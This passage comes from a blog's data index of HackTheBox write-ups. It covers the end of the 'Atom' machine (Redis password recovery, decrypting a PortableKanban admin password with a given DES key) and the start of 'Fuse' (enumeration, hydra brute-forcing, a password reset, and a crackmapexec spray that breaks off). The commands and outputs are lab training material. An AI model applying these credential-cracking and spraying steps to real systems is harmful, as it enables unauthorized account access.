11.4pt\u0026#34;,\u0026#34;HeaderShowCount\u0026#34;:true,\u0026#34;HeaderShowLimit\u0026#34;:true,\u0026#34;HeaderShowEstimates\u0026#34;:true,\u0026#34;HeaderShowPoints\u0026#34;:false,\u0026#34;HeaderForeColor\u0026#34;:\u0026#34;WhiteSmoke\u0026#34;,\u0026#34;HeaderBackColor\u0026#34;:\u0026#34;Gray\u0026#34;,\u0026#34;CardFont\u0026#34;:\u0026#34;Segoe UI, 11.4pt\u0026#34;,\u0026#34;CardLines\u0026#34;:3,\u0026#34;CardTextAlignment\u0026#34;:\u0026#34;Center\u0026#34;,\u0026#34;CardShowMarks\u0026#34;:true,\u0026#34;CardShowInitials\u0026#34;:false,\u0026#34;CardShowTags\u0026#34;:true,\u0026#34;ThickTags\u0026#34;:false,\u0026#34;DefaultTaskForeColor\u0026#34;:\u0026#34;WhiteSmoke\u0026#34;,\u0026#34;DefaultTaskBackColor\u0026#34;:\u0026#34;Gray\u0026#34;,\u0026#34;SelectedTaskForeColor\u0026#34;:\u0026#34;WhiteSmoke\u0026#34;,\u0026#34;SelectedTaskBackColor\u0026#34;:\u0026#34;Black\u0026#34;,\u0026#34;SelectedTaskFrames\u0026#34;:false,\u0026#34;SelectedTaskFrameColor\u0026#34;:\u0026#34;WhiteSmoke\u0026#34;,\u0026#34;SelectedTaskThickFrames\u0026#34;:false,\u0026#34;WarmTasksThreshold\u0026#34;:0,\u0026#34;WarmTaskForeColor\u0026#34;:\u0026#34;WhiteSmoke\u0026#34;,\u0026#34;WarmTaskBackColor\u0026#34;:\u0026#34;MediumBlue\u0026#34;,\u0026#34;WarmTaskFrameColor\u0026#34;:\u0026#34;Goldenrod\u0026#34;,\u0026#34;HotTasksThreshold\u0026#34;:1,\u0026#34;HotTaskForeColor\u0026#34;:\u0026#34;WhiteSmoke\u0026#34;,\u0026#34;HotTaskBackColor\u0026#34;:\u0026#34;Blue\u0026#34;,\u0026#34;HotTaskFrameColor\u0026#34;:\u0026#34;Yellow\u0026#34;,\u0026#34;OverdueTaskForeColor\u0026#34;:\u0026#34;WhiteSmoke\u0026#34;,\u0026#34;OverdueTaskBackColor\u0026#34;:\u0026#34;OrangeRed\u0026#34;,\u0026#34;OverdueTaskFrameColor\u0026#34;:\u0026#34;OrangeRed\u0026#34;,\u0026#34;WarmHotTaskFrames\u0026#34;:false,\u0026#34;WarmHotTaskThickFrames\u0026#34;:false,\u0026#34;BusinessDaysOnly\u0026#34;:false,\u0026#34;TrackedTaskForeColor\u0026#34;:\u0026#34;WhiteSmoke\u0026#34;,\u0026#34;TrackedTaskBackColor\u0026#34;:\u0026#34;Red\u0026#34;,\u0026#34;ShowSubtasksInEditBox\u0026#34;:true,\u0026#34;CheckForDuplicates\u0026#34;:true,\u0026#34;WarnBeforeDeleting\u0026#34;:true,\u0026#34;ProgressIncrement\u0026#34;:5,\u0026#34;DisableCreated\u0026#34;:false,\u0026#34;DefaultPriority\u0026#34;:\u0026#34;Low\u0026#34;,\u0026#34;DefaultDeadlineTime\u0026#34;:\u0026#34;PT0S\u0026#34;,\u0026#34;ShowTaskComments\u0026#34;:true,\u0026#34;IntervalFormat\u0026#34;:\u0026#34;Hours\u0026#34;,\u0026#34;WorkUnitDuration\u0026#34;:1,\u0026#34;SelectAnyColumn\u0026#34;:false,\u0026#34;ShowInfo\u0026#34;:true,\u0026#34;CardInfoFont\u0026#34;:\u0026#34;Segoe UI, 9pt\u0026#34;,\u0026#34;InfoTextAlignment\u0026#34;:\u0026#34;Center\u0026#34;,\u0026#34;InfoShowPriority\u0026#34;:true,\u0026#34;InfoShowTopic\u0026#34;:true,\u0026#34;InfoShowPerson\u0026#34;:true,\u0026#34;InfoShowCreated\u0026#34;:true,\u0026#34;InfoShowDeadlineCompleted\u0026#34;:true,\u0026#34;InfoShowSubtasks\u0026#34;:false,\u0026#34;InfoShowEstimate\u0026#34;:false,\u0026#34;InfoShowSpent\u0026#34;:false,\u0026#34;InfoShowPoints\u0026#34;:false,\u0026#34;InfoShowProgress\u0026#34;:true,\u0026#34;InfoShowCommentsCount\u0026#34;:false,\u0026#34;InfoShowTags\u0026#34;:false,\u0026#34;InfoShowCustomFields\u0026#34;:false,\u0026#34;ShowToolTips\u0026#34;:true,\u0026#34;ToolTipShowText\u0026#34;:true,\u0026#34;ToolTipTextLimit\u0026#34;:200,\u0026#34;ToolTipShowPriority\u0026#34;:true,\u0026#34;ToolTipShowTopic\u0026#34;:true,\u0026#34;ToolTipShowPerson\u0026#34;:true,\u0026#34;ToolTipShowCreated\u0026#34;:false,\u0026#34;ToolTipShowDeadlineCompleted\u0026#34;:true,\u0026#34;ToolTipShowSubtasks\u0026#34;:true,\u0026#34;ToolTipShowEstimate\u0026#34;:true,\u0026#34;ToolTipShowSpent\u0026#34;:true,\u0026#34;ToolTipShowPoints\u0026#34;:true,\u0026#34;ToolTipShowProgress\u0026#34;:true,\u0026#34;ToolTipShowCommentsCount\u0026#34;:false,\u0026#34;ToolTipShowTags\u0026#34;:false,\u0026#34;ToolTipShowCustomFields\u0026#34;:false,\u0026#34;TimerWorkInterval\u0026#34;:25,\u0026#34;TimeShortBreakInterval\u0026#34;:5,\u0026#34;TimerLongBreakInterval\u0026#34;:15,\u0026#34;PlaySound\u0026#34;:1000,\u0026#34;ActivateWindow\u0026#34;:false,\u0026#34;TaskBarProgress\u0026#34;:true,\u0026#34;EnableTimeTracking\u0026#34;:true,\u0026#34;AlertOnNewTask\u0026#34;:false,\u0026#34;AlertOnModifiedTask\u0026#34;:false,\u0026#34;AlertOnCompletedTask\u0026#34;:false,\u0026#34;AlertOnCanceledTask\u0026#34;:false,\u0026#34;AlertOnReassignedTask\u0026#34;:false,\u0026#34;AlertOnMovedTask\u0026#34;:false,\u0026#34;AlertOnDeletedTask\u0026#34;:false,\u0026#34;AlertMethod\u0026#34;:\u0026#34;None\u0026#34;,\u0026#34;EmailLogon\u0026#34;:true,\u0026#34;EmailReviewMessage\u0026#34;:true,\u0026#34;EmailSmtpPort\u0026#34;:587,\u0026#34;EmailSmtpDeliveryMethod\u0026#34;:\u0026#34;Network\u0026#34;,\u0026#34;EmailSmtpUseDefaultCredentials\u0026#34;:false,\u0026#34;EmailSmtpEnableSSL\u0026#34;:false,\u0026#34;EmailSmtpTimeout\u0026#34;:5,\u0026#34;EmailAttachFile\u0026#34;:true,\u0026#34;EmailNewTaskSubject\u0026#34;:\u0026#34;PortableKanban Notification: New task has been created\u0026#34;,\u0026#34;EmailDeletedTaskSubject\u0026#34;:\u0026#34;PortableKanban Notification: Task has been deleted\u0026#34;,\u0026#34;EmailEditedTaskSubject\u0026#34;:\u0026#34;PortableKanban Notification: Task has been modified\u0026#34;,\u0026#34;EmailCompletedTaskSubject\u0026#34;:\u0026#34;PortableKanban Notification: Task has been completed\u0026#34;,\u0026#34;EmailCanceledTaskSubject\u0026#34;:\u0026#34;PortableKanban Notification: Task has been canceled\u0026#34;,\u0026#34;EmailReassignedTaskSubject\u0026#34;:\u0026#34;PortableKanban Notification: Task has been reassigned\u0026#34;,\u0026#34;EmailMovedTaskSubject\u0026#34;:\u0026#34;PortableKanban Notification: Task has been moved\u0026#34;,\u0026#34;EmailSignature\u0026#34;:\u0026#34;This is automatic message.\u0026#34;,\u0026#34;PluginsSettings\u0026#34;:{\u0026#34;bd5d2026e1f7424eab8690a62ad05ad2\u0026#34;:{},\u0026#34;07a0d797c97c41f789af21ff4298754e\u0026#34;:{\u0026#34;SourceColumnId\u0026#34;:\u0026#34;00000000000000000000000000000000\u0026#34;,\u0026#34;DestinationColumnId\u0026#34;:\u0026#34;00000000000000000000000000000000\u0026#34;,\u0026#34;Age\u0026#34;:30},\u0026#34;2e470c79feb946f2b6e74b35245f8e80\u0026#34;:{\u0026#34;FromDate\u0026#34;:\u0026#34;\\/Date(1617346800000-0700)\\/\u0026#34;,\u0026#34;ToDate\u0026#34;:\u0026#34;\\/Date(1617346800000-0700)\\/\u0026#34;,\u0026#34;IncludeTopics\u0026#34;:false,\u0026#34;IncludeTags\u0026#34;:false,\u0026#34;IncludeComments\u0026#34;:false,\u0026#34;ReportType\u0026#34;:\u0026#34;Html\u0026#34;,\u0026#34;SortByUser\u0026#34;:true},\u0026#34;680986568fed41c381ef9f230feaa102\u0026#34;:{\u0026#34;RunOnStartup\u0026#34;:false},\u0026#34;24b7acead7984f8ab16bdb0ae8559fb6\u0026#34;:{\u0026#34;TopicId\u0026#34;:\u0026#34;00000000000000000000000000000000\u0026#34;,\u0026#34;ColumnId\u0026#34;:\u0026#34;00000000000000000000000000000000\u0026#34;,\u0026#34;FromPersonId\u0026#34;:\u0026#34;00000000000000000000000000000000\u0026#34;,\u0026#34;ToPersonId\u0026#34;:\u0026#34;00000000000000000000000000000000\u0026#34;}},\u0026#34;AutoLogon\u0026#34;:false,\u0026#34;LogonUserName\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;EncLogonPassword\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;ExitOnSuspend\u0026#34;:false,\u0026#34;DropFilesFolder\u0026#34;:\u0026#34;Files\u0026#34;,\u0026#34;UseRelativePath\u0026#34;:true,\u0026#34;ConfirmFileDeleteion\u0026#34;:true,\u0026#34;DefaultDropFilesActionOption\u0026#34;:\u0026#34;Copy\u0026#34;,\u0026#34;CreateNewTaskForEachDroppedFile\u0026#34;:true,\u0026#34;ParseDroppedEmails\u0026#34;:true,\u0026#34;RestoreWindowsLocation\u0026#34;:true,\u0026#34;DesktopShortcut\u0026#34;:false,\u0026#34;DailyBackup\u0026#34;:false,\u0026#34;BackupTime\u0026#34;:\u0026#34;PT0S\u0026#34;,\u0026#34;BlockEscape\u0026#34;:false,\u0026#34;BlackWhiteIcon\u0026#34;:true,\u0026#34;ShowTimer\u0026#34;:true,\u0026#34;ViewId\u0026#34;:\u0026#34;00000000000000000000000000000000\u0026#34;,\u0026#34;SearchInSubtasks\u0026#34;:false,\u0026#34;ReportIncludeComments\u0026#34;:true,\u0026#34;ReportIncludeSubTasks\u0026#34;:true,\u0026#34;ReportIncludeTimeTracks\u0026#34;:true,\u0026#34;ReportIncludeCustomFields\u0026#34;:true},\u0026#34;LocalSettingsMap\u0026#34;:{\u0026#34;ATOM\u0026#34;:{\u0026#34;Left\u0026#34;:320,\u0026#34;Top\u0026#34;:2,\u0026#34;Width\u0026#34;:800,\u0026#34;Height\u0026#34;:601,\u0026#34;Minimized\u0026#34;:false,\u0026#34;Maximized\u0026#34;:false,\u0026#34;FullScreen\u0026#34;:false,\u0026#34;Hidden\u0026#34;:false,\u0026#34;AboutBoxLeft\u0026#34;:0,\u0026#34;AboutBoxTop\u0026#34;:0,\u0026#34;AboutBoxWidth\u0026#34;:0,\u0026#34;AboutBoxHeight\u0026#34;:0,\u0026#34;EditBoxLeft\u0026#34;:0,\u0026#34;EditBoxTop\u0026#34;:0,\u0026#34;EditBoxWidth\u0026#34;:0,\u0026#34;EditBoxHeight\u0026#34;:0,\u0026#34;EditBoxSplitterOrientation\u0026#34;:1,\u0026#34;EditBoxSplitterDistance\u0026#34;:0,\u0026#34;EditBoxFontSize\u0026#34;:0,\u0026#34;EditBoxCommentsSortDirection\u0026#34;:\u0026#34;Ascending\u0026#34;,\u0026#34;ReportBoxLeft\u0026#34;:370,\u0026#34;ReportBoxTop\u0026#34;:27,\u0026#34;ReportBoxWidth\u0026#34;:700,\u0026#34;ReportBoxHeight\u0026#34;:551,\u0026#34;SetupBoxLeft\u0026#34;:370,\u0026#34;SetupBoxTop\u0026#34;:52,\u0026#34;SetupBoxWidth\u0026#34;:700,\u0026#34;SetupBoxHeight\u0026#34;:501,\u0026#34;ViewBoxLeft\u0026#34;:0,\u0026#34;ViewBoxTop\u0026#34;:0,\u0026#34;ViewBoxWidth\u0026#34;:0,\u0026#34;ViewBoxHeight\u0026#34;:0,\u0026#34;LogonBoxLeft\u0026#34;:520,\u0026#34;LogonBoxTop\u0026#34;:202,\u0026#34;LogonBoxWidth\u0026#34;:400,\u0026#34;LogonBoxHeight\u0026#34;:201}}} We see the creds for redis Looks like PortableKanban uses redis as storage DbEncPassword:Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb Let\u0026rsquo;s check redis c:\\Program Files\\Redis\u0026gt;dir dir Volume in drive C has no label. Volume Serial Number is 9793-C2E6 Directory of c:\\Program Files\\Redis 09/11/2023 08:20 AM \u0026lt;DIR\u0026gt; . 09/11/2023 08:20 AM \u0026lt;DIR\u0026gt; .. 07/01/2016 03:54 PM 1,024 EventLog.dll 04/02/2021 07:31 AM \u0026lt;DIR\u0026gt; Logs 07/01/2016 03:52 PM 12,618 Redis on Windows Release Notes.docx 07/01/2016 03:52 PM 16,769 Redis on Windows.docx 07/01/2016 03:55 PM 406,016 redis-benchmark.exe 07/01/2016 03:55 PM 4,370,432 redis-benchmark.pdb 07/01/2016 03:55 PM 257,024 redis-check-aof.exe 07/01/2016 03:55 PM 3,518,464 redis-check-aof.pdb 07/01/2016 03:55 PM 268,288 redis-check-dump.exe 07/01/2016 03:55 PM 3,485,696 redis-check-dump.pdb 07/01/2016 03:55 PM 482,304 redis-cli.exe 07/01/2016 03:55 PM 4,517,888 redis-cli.pdb 07/01/2016 03:55 PM 1,553,408 redis-server.exe 07/01/2016 03:55 PM 6,909,952 redis-server.pdb 04/02/2021 07:39 AM 43,962 redis.windows-service.conf 04/02/2021 07:37 AM 43,960 redis.windows.conf 07/01/2016 09:17 AM 14,265 Windows Service Documentation.docx We can try grepping for password https://shyammakwana.me/redis/set-redis-password-in-windows-and-ubuntu.html And looks like we have one: kidvscat_yes_kidvscat PS C:\\Program Files\\Redis\u0026gt; cat *.conf | select-string -pattern \u0026#34;pass\u0026#34; cat *.conf | select-string -pattern \u0026#34;pass\u0026#34; requirepass kidvscat_yes_kidvscat # If the master is password protected (using the \u0026#34;requirepass\u0026#34; configuration # masterauth \u0026lt;master-password\u0026gt; # resync is enough, just passing the portion of data the slave missed while # Require clients to issue AUTH \u0026lt;PASSWORD\u0026gt; before processing any other # 150k passwords per second against a good box. This means that you should # use a very strong password otherwise it will be very easy to break. # requirepass foobared requirepass kidvscat_yes_kidvscat # If the master is password protected (using the \u0026#34;requirepass\u0026#34; configuration # masterauth \u0026lt;master-password\u0026gt; # resync is enough, just passing the portion of data the slave missed while # Require clients to issue AUTH \u0026lt;PASSWORD\u0026gt; before processing any other # 150k passwords per second against a good box. This means that you should # use a very strong password otherwise it will be very easy to break. # requirepass foobared Let\u0026rsquo;s connect to redis https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#redis-authentication └─$ redis-cli -h 10.10.10.237 10.10.10.237:6379\u0026gt; auth kidvscat_yes_kidvscat OK 10.10.10.237:6379\u0026gt; keys * 1) \u0026#34;pk:ids:User\u0026#34; 2) \u0026#34;pk:ids:MetaDataClass\u0026#34; 3) \u0026#34;pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff\u0026#34; 4) \u0026#34;pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0\u0026#34; 10.10.10.237:6379\u0026gt; We have a key pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0 Let\u0026rsquo;s get it 10.10.10.237:6379\u0026gt; get \u0026#34;pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0\u0026#34; \u0026#34;{\\\u0026#34;Id\\\u0026#34;:\\\u0026#34;e8e29158d70d44b1a1ba4949d52790a0\\\u0026#34;,\\\u0026#34;Name\\\u0026#34;:\\\u0026#34;Administrator\\\u0026#34;,\\\u0026#34;Initials\\\u0026#34;:\\\u0026#34;\\\u0026#34;,\\\u0026#34;Email\\\u0026#34;:\\\u0026#34;\\\u0026#34;,\\\u0026#34;EncryptedPassword\\\u0026#34;:\\\u0026#34;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\\\u0026#34;,\\\u0026#34;Role\\\u0026#34;:\\\u0026#34;Admin\\\u0026#34;,\\\u0026#34;Inactive\\\u0026#34;:false,\\\u0026#34;TimeStamp\\\u0026#34;:637530169606440253}\u0026#34; Now we have encrypted password of PortableKanban Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi Using the post as template I used CyberChef The post uses: DES decrypt Key: 7ly6UznJ IV: XuVUm5fR Now we have Administrator\u0026rsquo;s password: kidvscat_admin_@123 Let\u0026rsquo;s connect P.S. This box is also vulnerable to PrintNightmare ","date":"September 8, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/atom/images/atom.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/atom/","summary":"Atom Enumeration nmap └─$ nmap -Pn -p- 10.10.10.237 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 15:42 BST Nmap scan report for 10.10.10.237 (10.10.10.237) Host is up (0.094s latency). Not shown: 65528 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 443/tcp open https 445/tcp open microsoft-ds 5985/tcp open wsman 6379/tcp open redis 7680/tcp open pando-pub └─$ nmap -Pn -p80,135,443,445,5985,6379,7680 -sC -sV 10.10.10.237 -T4 Starting Nmap 7.","tags":["HTB","xampp","redis","reverse-engineering","portable-kanban","smbmap","smbclient","crackmapexec","asar","nodejs","electron","msfvenom","cyberchef","printnightmare","invoke-nightmare","cve-2021-34527"],"title":"[HTB] Machine: Atom"},{"categories":null,"contents":"Fuse Enumeration nmap └─$ nmap -Pn -p- 10.10.10.193 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 16:32 BST Nmap scan report for 10.10.10.193 (10.10.10.193) Host is up (0.092s latency). Not shown: 65517 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 49667/tcp open unknown 49675/tcp open unknown 49676/tcp open unknown 49680/tcp open unknown 49698/tcp open unknown └─$ nmap -Pn -p53,80,88,135,139,445,464,593,636,3268,3269,5985 -sC -sV 10.10.10.193 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 17:23 BST Nmap scan report for 10.10.10.193 (10.10.10.193) Host is up (0.16s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: Site doesn\u0026#39;t have a title (text/html). | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-09 16:35:34Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open ��7a)V Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-09-09T16:35:42 |_ start_date: 2023-09-09T15:42:29 |_clock-skew: mean: 2h32m23s, deviation: 4h02m30s, median: 12m22s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: Fuse | NetBIOS computer name: FUSE\\x00 | Domain name: fabricorp.local | Forest name: fabricorp.local | FQDN: Fuse.fabricorp.local |_ System time: 2023-09-09T09:35:41-07:00 smb └─$ smbclient -N -L //10.10.10.193 Anonymous login successful Sharename Type Comment --------- ---- ------- Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.10.193 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available ldapsearch └─$ ldapsearch -H ldap://10.10.10.193 -x -s base namingcontexts # extended LDIF # # LDAPv3 # base \u0026lt;\u0026gt; (default) with scope baseObject # filter: (objectclass=*) # requesting: namingcontexts # # dn: namingContexts: DC=fabricorp,DC=local namingContexts: CN=Configuration,DC=fabricorp,DC=local namingContexts: CN=Schema,CN=Configuration,DC=fabricorp,DC=local namingContexts: DC=DomainDnsZones,DC=fabricorp,DC=local namingContexts: DC=ForestDnsZones,DC=fabricorp,DC=local # search result search: 2 result: 0 Success # numResponses: 2 # numEntries: 1 └─$ ldapsearch -H ldap://10.10.10.193 -x -b \u0026#34;DC=fabricorp,DC=local\u0026#34; # extended LDIF # # LDAPv3 # base \u0026lt;DC=fabricorp,DC=local\u0026gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # # search result search: 2 result: 1 Operations error text: 000004DC: LdapErr: DSID-0C090A6C, comment: In order to perform this opera tion a successful bind must be completed on the connection., data 0, v3839 # numResponses: 1 rpc └─$ rpcclient -U \u0026#34;\u0026#34; -N 10.10.10.193 rpcclient $\u0026gt; querydispinfo result was NT_STATUS_ACCESS_DENIED rpcclient $\u0026gt; enumdomusers result was NT_STATUS_ACCESS_DENIED rpcclient $\u0026gt; Web Server gobuster found nothing Foothold We can check the print logs And we the usernames which we can use for brute forcing administrator bhult pmerton tlavel sthompson So the only thing left is to try brute-forcing Let\u0026rsquo;s generate a password list └─$ cewl http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers \u0026gt; cewl.list └─$ hydra -L users.list -P cewl.list fuse.fabricorp.local smb Hydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-09 20:41:50 [INFO] Reduced number of tasks to 1 (smb does not like parallel connections) [DATA] max 1 task per 1 server, overall 1 task, 850 login tries (l:5/p:170), ~850 tries per task [DATA] attacking smb://fuse.fabricorp.local:445/ [STATUS] 141.00 tries/min, 141 tries in 00:01h, 709 to do in 00:06h, 1 active [445][smb] Host: 10.10.10.193 Account: bhult Valid password, password expired and must be changed on next logon [445][smb] host: fuse.fabricorp.local login: bhult password: Fabricorp01 [STATUS] 161.33 tries/min, 484 tries in 00:03h, 366 to do in 00:03h, 1 active [445][smb] Host: 10.10.10.193 Account: tlavel Valid password, password expired and must be changed on next logon [445][smb] host: fuse.fabricorp.local login: tlavel password: Fabricorp01 1 of 1 target successfully completed, 2 valid passwords found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-09 20:47:02 If we try to check smb with the new creds, we have a NT_STATUS_PASSWORD_MUST_CHANGE └─$ smbclient -U bhult -L \\\\10.10.10.193 Password for [WORKGROUP\\bhult]: session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE └─$ smbclient -U tlavel -L \\\\10.10.10.193 Password for [WORKGROUP\\tlavel]: session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE I set the new password and checked smb again └─$ impacket-smbpasswd fabricorp.local/tlavel:Fabricorp01@10.10.10.193 -newpass \u0026#39;P@ssw0rd!!!\u0026#39; Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [!] Password is expired, trying to bind with a null session. [*] Password was changed successfully. └─$ smbmap -u tlavel -p \u0026#39;P@ssw0rd!!!\u0026#39; -H 10.10.10.193 -R \u0026#39;\u0026#39; [+] IP: 10.10.10.193:445 Name: fuse.fabricorp.local Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share HP-MFT01 NO ACCESS HP-MFT01 IPC$ READ ONLY Remote IPC .\\IPC$\\* fr--r--r-- 3 Sun Dec 31 23:58:45 1600 InitShutdown fr--r--r-- 4 Sun Dec 31 23:58:45 1600 lsass fr--r--r-- 3 Sun Dec 31 23:58:45 1600 ntsvcs fr--r--r-- 3 Sun Dec 31 23:58:45 1600 scerpc fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\\CatalogChangeListener-36c-0 fr--r--r-- 3 Sun Dec 31 23:58:45 1600 epmapper fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\\CatalogChangeListener-1e4-0 fr--r--r-- 3 Sun Dec 31 23:58:45 1600 LSM_API_service fr--r--r-- 3 Sun Dec 31 23:58:45 1600 eventlog fr--r--r-- 1 Sun Dec 31 23:58:45 1600 Winsock2\\CatalogChangeListener-3e0-0 fr--r--r-- 4 Sun Dec 31 23:58:45 1600 wkssvc fr--r--r-- 3 Sun Dec 31 23:58:45 1600 atsvc ... dr--r--r-- 0 Sat May 30 00:29:21 2020 .. fr--r--r-- 22 Sat May 30 00:29:21 2020 GPT.INI dr--r--r-- 0 Sat May 30 00:29:21 2020 MACHINE dr--r--r-- 0 Sat May 30 00:29:21 2020 USER .\\SYSVOL\\fabricorp.local\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\* dr--r--r-- 0 Sat May 30 00:29:21 2020 . dr--r--r-- 0 Sat May 30 00:29:21 2020 .. dr--r--r-- 0 Sat May 30 00:29:21 2020 Microsoft .\\SYSVOL\\fabricorp.local\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Microsoft\\* dr--r--r-- 0 Sat May 30 00:29:21 2020 . dr--r--r-- 0 Sat May 30 00:29:21 2020 .. dr--r--r-- 0 Sat May 30 00:29:21 2020 Windows NT .\\SYSVOL\\fabricorp.local\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\* dr--r--r-- 0 Sat May 30 00:29:21 2020 . dr--r--r-- 0 Sat May 30 00:29:21 2020 .. fr--r--r-- 22 Sat May 30 00:47:55 2020 GPT.INI dr--r--r-- 0 Sat May 30 00:29:21 2020 MACHINE dr--r--r-- 0 Sat May 30 00:29:21 2020 USER .\\SYSVOL\\fabricorp.local\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\MACHINE\\* dr--r--r-- 0 Sat May 30 00:29:21 2020 . dr--r--r-- 0 Sat May 30 00:29:21 2020 .. dr--r--r-- 0 Sat May 30 00:29:21 2020 Microsoft .\\SYSVOL\\fabricorp.local\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\MACHINE\\Microsoft\\* dr--r--r-- 0 Sat May 30 00:29:21 2020 . dr--r--r-- 0 Sat May 30 00:29:21 2020 .. dr--r--r-- 0 Sat May 30 00:29:21 2020 Windows NT Nothing interesting on smb Let\u0026rsquo;s check rpc Note: password will be reset again, so we have to change it again └─$ rpcclient -U \u0026#34;tlavel\u0026#34; -N 10.10.10.193 --password=\u0026#39;P@ssw0rd123\u0026#39; rpcclient $\u0026gt; querydispinfo index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator Name: (null) Desc: Built-in account for administering the computer/domain index: 0x109c RID: 0x1db2 acb: 0x00000210 Account: astein Name: (null) Desc: (null) index: 0x1099 RID: 0x1bbd acb: 0x00020010 Account: bhult Name: (null) Desc: (null) index: 0x1092 RID: 0x451 acb: 0x00020010 Account: bnielson Name: (null) Desc: (null) index: 0x109a RID: 0x1bbe acb: 0x00000211 Account: dandrews Name: (null) Desc: (null) index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null) Desc: A user account managed by the system. index: 0x109d RID: 0x1db3 acb: 0x00000210 Account: dmuir Name: (null) Desc: (null) index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest Name: (null) Desc: Built-in account for guest access to the computer/domain index: 0xff4 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null) Desc: Key Distribution Center Service Account index: 0x109b RID: 0x1db1 acb: 0x00000210 Account: mberbatov Name: (null) Desc: (null) index: 0x1096 RID: 0x643 acb: 0x00000210 Account: pmerton Name: (null) Desc: (null) index: 0x1094 RID: 0x641 acb: 0x00000210 Account: sthompson Name: (null) Desc: (null) index: 0x1091 RID: 0x450 acb: 0x00000210 Account: svc-print Name: (null) Desc: (null) index: 0x1098 RID: 0x645 acb: 0x00000210 Account: svc-scan Name: (null) Desc: (null) index: 0x1095 RID: 0x642 acb: 0x00000010 Account: tlavel Name: (null) Desc: (null) We saw a printer service on port 80, so let\u0026rsquo;s check printers rpcclient $\u0026gt; enumprinters flags:[0x800000] name:[\\\\10.10.10.193\\HP-MFT01] description:[\\\\10.10.10.193\\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)] comment:[] rpcclient $\u0026gt; And we have some creds Let\u0026rsquo;s password spray └─$ crackmapexec smb 10.10.10.193 -u users.list -p \u0026#39;$fab@s3Rv1ce$1\u0026#39; --continue-on-success SMB 10.10.10.193 445 FUSE [*] Windows Server 2016 Standard 14393 x64 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True) SMB 10.10.10.193 445 FUSE [-] fabricorp.local\\Administrator:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE SMB 10.10.10.193 445 FUSE [-] fabricorp.local\\astein:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE SMB 10.10.10.193 445 FUSE [-] fabricorp.local\\bhult:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE SMB 10.10.10.193 445 FUSE [-] fabricorp.local\\bnielson:$fab@s3Rv1ce$1 